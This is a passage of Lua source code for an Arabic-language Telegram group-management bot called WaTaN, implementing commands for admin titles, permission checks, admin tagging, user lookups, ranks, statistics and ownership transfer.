if text and text:match("^حذف لقب @(.*)$") and ChanSub(msg) and Constructor(msg) then
local username = text:match("^حذف لقب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم حذف لقبه من الكروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text == 'لقبي' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,'✯︙وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,'✯︙لقبك هو : '..GeId.result.custom_title) 
end
end
if text == "فحص البوت" and ChanSub(msg) and Manager(msg) then
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = '❴ ✔️ ❵' 
else 
INf = '❴ ✖ ❵' 
end
if getInfo.result.can_delete_messages == true then
DEL = '❴ ✔️ ❵' 
else 
DEL = '❴ ✖ ❵' 
end
if getInfo.result.can_invite_users == true then
INv = '❴ ✔️ ❵' 
else
INv = '❴ ✖ ❵' 
end
if getInfo.result.can_pin_messages == true then
Pin = '❴ ✔️ ❵' 
else
Pin = '❴ ✖ ❵' 
end
if getInfo.result.can_restrict_members == true then
REs = '❴ ✔️ ❵' 
else 
REs = '❴ ✖ ❵' 
end
if getInfo.result.can_promote_members == true then
PRo = '❴ ✔️ ❵'
else
PRo = '❴ ✖ ❵'
end 
send(msg.chat_id_, msg.id_,'\n✯︙صلاحيات البوت هي\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙علامة ال {✔️} تعني مفعل\n✯︙علامة ال {✖} تعني غير مفعل\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙تغير معلومات المجموعة ↞ '..INf..'\n✯︙حذف الرسائل ↞ '..DEL..'\n✯︙حظر المستخدمين ↞ '..REs..'\n✯︙دعوة المستخدمين ↞ '..INv..'\n✯︙ثتبيت الرسالة ↞ '..Pin..'\n✯︙اضافة مشرفين ↞ '..PRo)   
end
end
if text and text == "تفعيل تاك المشرفين" and ChanSub(msg) and Manager(msg) then 
database:set(bot_id.."WaTaNTeaM:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"✯︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and ChanSub(msg) and Manager(msg) then 
database:del(bot_id.."WaTaNTeaM:Tag:Admins:"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "✯︙تم تعطيل تاك المشرفين")
end

if text == 'صيح المشرفين' and ChanSub(msg) or text == "تاك للمشرفين" and ChanSub(msg) or text == "وين المشرفين" and ChanSub(msg) or text == "المشرفين" and ChanSub(msg) then
if database:get(bot_id.."WaTaNTeaM:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,b)  
if b.username_ then 
User_id = "@"..b.username_
else
User_id = msg.sender_user_id_
end 
local t = "\n✯︙المستخدم ~ ["..User_id .."] يصيح المشرفين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
k = 0
for i,v in pairs(data.members_) do
if bot_id ~= v.user_id_ then 
k = k + 1
local username = database:get(bot_id.."user:Name"..v.user_id_)
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..k.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..k.." → {`"..v.user_id_.."`}\n"
end
end
end
send(msg.chat_id_, msg.id_,t)
end,nil)
end,nil)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----

if text == "الساعه" and ChanSub(msg) then
local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,ramsesj20)
end

if text == "التاريخ" and ChanSub(msg) then
local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,ramsesj20)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("الردود المتعدده") and ChanSub(msg) and CoSu(msg) then
local list = database:smembers(bot_id.."botss:WaTaN:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد" and ChanSub(msg) and Constructor(msg) then
database:set(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"✯︙ارسل الرد الذي اريد اضافته")
end
if text == "حذف رد متعدد" and ChanSub(msg) and Constructor(msg) then
database:set(bot_id.."botss:WaTaN:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"✯︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:WaTaN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"✯︙تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:WaTaN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"✯︙تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:WaTaN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"✯︙تم حفظ الرد")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ""..(database:get(bot_id..'Name:Bot') or 'وطن').." غادر" or text == 'غادر' then  
if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'✯︙تم مغادرة المجموعه') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
if text == 'بوت' and ChanSub(msg) then
Namebot = (database:get(bot_id..'Name:Bot') or 'وطن')
send(msg.chat_id_, msg.id_,'اسمي ['..Namebot..'] عمري ')
end
if text == 'الاحصائيات' and ChanSub(msg) then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ✯ \n'..'✯︙عدد الكروبات » {'..Groups..'}'..'\n✯︙عدد المشتركين » {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'روابط الكروبات' and ChanSub(msg) or text == 'روابط المجموعات' and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
local List = database:smembers(bot_id..'Chek:Groups')
if #List == 0 then
send(msg.chat_id_, msg.id_,'✯︙لا توجد مجموعات مفعله')
else
send(msg.chat_id_, msg.id_,'✯︙جاري ارسال نسخه تحتوي على : '..#List..' مجموعه')
local Text = "✯︙Source WaTaN\n✯︙File Bot Groups\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(List) do
local GroupsManagers = database:scard(bot_id.."Manager"..v) or 0
local GroupsAdmins = database:scard(bot_id.."Mod:User"..v) or 0
local Groupslink = database:get(bot_id.."Private:Group:Link"..v)
Text = Text..k.." : \n✯︙Group ID : "..v.."\n✯︙Group Link : "..(Groupslink or "Not Found").."\n✯︙Group Managers : "..GroupsManagers.."\n✯︙Group Admins : "..GroupsAdmins.."\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي") and msg.reply_to_message_id_ == 0 and DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,'✯︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
database:setex(bot_id.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if database:get(bot_id.."Abs:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'✯︙تم الغاء امر تغير المطور الاساسي')
database:del(bot_id.."Abs:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
database:del(bot_id.."Abs:EditDev"..msg.sender_user_id_)
database:set(bot_id.."Abs:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n✯︙المعرف : [@'..dp.username_..']' else DevUser = '' end
local Text = '✯︙الايدي : '..dp.id_..DevUser..'\n✯︙الاسم : ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n✯︙تم حفظ المعلومات بنجاح\n✯︙استخدم الازرار للتاكيد :'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"✯︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
database:del(bot_id.."Abs:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
if text == 'الكروبات' and ChanSub(msg) then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '✯︙عدد الكروبات » {`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المشتركين' and ChanSub(msg) then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '✯︙عدد المشتركين » {`'..Users..'|}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'تفعيل المغادره' and ChanSub(msg) and DevWaTaN(msg) then   
if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = '✯︙تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and ChanSub(msg) and DevWaTaN(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = '✯︙تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = '✯︙بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end

if text == 'تفعيل ردود المدير' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
Text = '✯︙تم تفعيل ردود المدير'
database:del(bot_id..'Reply:Manager'..msg.chat_id_)  
else
Text = '✯︙تم تفعيل ردود المدير'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ردود المدير' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل ردود المدير' 
else
Text = '\n✯︙بالتاكيد تم تعطيل ردود المدير'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل ردود المطور' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n✯︙تم تفعيل ردود المطور' 
else
Text = '\n✯︙بالتاكيد تم تفعيل ردود المطور'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ردود المطور' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n✯︙تم تعطيل ردود المطور' 
else
Text = '\n✯︙بالتاكيد تم تعطيل ردود المطور'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
Text = '\n✯︙تم تفعيل الايدي' 
else
Text = '\n✯︙بالتاكيد تم تفعيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
Text = '\n✯︙تم تعطيل الايدي' 
else
Text = '\n✯︙بالتاكيد تم تعطيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي بالصوره' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n✯︙تم تفعيل الايدي بالصور' 
else
Text = '\n✯︙بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي بالصوره' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n✯︙تم تعطيل الايدي بالصوره' 
else
Text = '\n✯︙بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الحظر' and ChanSub(msg) and Constructor(msg) then   
if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:del(bot_id..'Lock:kick'..msg.chat_id_) 
Text = '\n✯︙تم تفعيل الحظر' 
else
Text = '\n✯︙بالتاكيد تم تفعيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الحظر' and ChanSub(msg) and Constructor(msg) then  
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
Text = '\n✯︙تم تعطيل الحظر' 
else
Text = '\n✯︙بالتاكيد تم تعطيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الرفع' and ChanSub(msg) and Constructor(msg) then   
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
Text = '\n✯︙تم تفعيل الرفع' 
else
Text = '\n✯︙بالتاكيد تم تفعيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الرفع' and ChanSub(msg) and Constructor(msg) then  
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
Text = '\n✯︙تم تعطيل الرفع' 
else
Text = '\n✯︙بالتاكيد تم تعطيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'✯︙ايديه ➸ '..iduser..'\n✯︙معرفه ➸ '..username..'\n✯︙رتبته ➸ '..rtp..'\n✯︙تعديلاته ➸ '..edit..'\n✯︙نقاطه ➸ '..NUMPGAME..'\n✯︙جهاته ➸ '..Contact..'\n✯︙رسائله ➸ '..Msguser..'')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") and ChanSub(msg) then
local username = text:match("^ايدي @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'✯︙ايديه ➸('..iduser..')\n✯︙معرفه ➸('..username..')\n✯︙رتبته ➸('..rtp..')\n✯︙تعديلاته ➸('..edit..')\n✯︙نقاطه ➸('..NUMPGAME..')\n✯︙جهاته ➸('..Contact..')\n✯︙رسائله ➸('..Msguser..')')
end,nil)
else
send(msg.chat_id_, msg.id_,'✯︙المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'رتبتي' and ChanSub(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,'✯︙رتبتك في البوت » '..rtp)
end
if text == "اسمي" and ChanSub(msg) then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = '✯︙اسمك الاول » {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = '✯︙اسمك الثاني » {`'..result.last_name_..'`}' 
else
last_name = ''
end      
send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
end,nil)
end 
if text == 'ايديي' and ChanSub(msg) then
send(msg.chat_id_, msg.id_,'✯︙ايديك » '..msg.sender_user_id_)
end
if text == 'الرتبه' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- العضو » (*'..username..'*)\n- الرتبه » ('..rtp..')*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^الرتبه @(.*)$") and ChanSub(msg) then
local username = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'*- العضو » (*'..username..'*)\n- الرتبه » ('..rtp..')*\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'- المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'watanteam')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*✯︙الاسم » *('..username..')\n*✯︙الايدي » ('..iduser..')*\n*✯︙الرتبه » ('..rtp..')*\n*✯︙نوع الكشف » بالرد*')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^كشف @(.*)$") then
local username = text:match("^كشف @(.*)$")
function Function_v(extra, result, success)
if result.id_ then
tdcli_function({ID = "GetUser",user_id_ = result.id_}, function(arg, data)
if data.username_ then
UserName_User = '@' .. data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local frLsn = data.first_name_..' '..(data.last_name_ or "")
local Status_Gps = Rutba(Id,msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n*✯︙الاسم » ('..frLsn..')\n✯︙الايدي » '..Id..'\n✯︙المعرف » *['..UserName_User..']*\n✯︙الرتبة » '..Status_Gps..'\n✯︙نوع الكشف - بالمعرف*')
end, nil)
else
send(msg.chat_id_, msg.id_, ' *✯︙لا يوجد حساب بهاذا المعرف*')
end
end
tdcli_function({ID = "SearchPublicChat",username_ = username}, Function_v, nil)
return false
end
if text and text:match("^كشف (%d+)$") then
local userid = text:match("^كشف (%d+)$") 
if userid then
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
local UserName = ("@"..data.username_ or "لا يوجد")
local id = userid
local rtp = Rutba(id,msg.chat_id_)
texts ='*✯︙الايدي » ('..id..')*\n*✯︙المعرف » (*['..UserName..'])\n*✯︙الرتبه » ('..rtp..')*\n*✯︙نوع الكشف » بالايدي*'
send(msg.chat_id_, msg.id_, texts)
end,nil)
return false
end
end  
if text==('عدد الكروب') and ChanSub(msg) and Mod(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," ✯︙البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local WaTaN = '✯︙عدد الادمنيه : '..data.administrator_count_..
'\n\n✯︙عدد المطرودين : '..data.kicked_count_..
'\n\n✯︙عدد الاعضاء : '..data.member_count_..
'\n\n✯︙عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n✯︙اسم الكروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, WaTaN) 
end,nil)
end,nil)
end 
if text == 'اطردني' and ChanSub(msg) or text == 'طردني' and ChanSub(msg) then
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Can_or_NotCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,'✯︙عذرا لا استطيع طرد ادمنية الكروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,'✯︙تم طردك من الكروب') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل امر اطردني') 
end
end
if text and text:match("^صيح (.*)$") and ChanSub(msg) then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,'✯︙المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'✯︙لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'✯︙لا استطيع اصيح معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⚠| لا اسطيع صيح معرفات الكروبات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,'✯︙تعال حبي يصيحونك بل كروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل امر صيح') 
end
return false
end

if text == 'منو ضافني' and ChanSub(msg) then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'✯︙انت منشئ الكروب') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
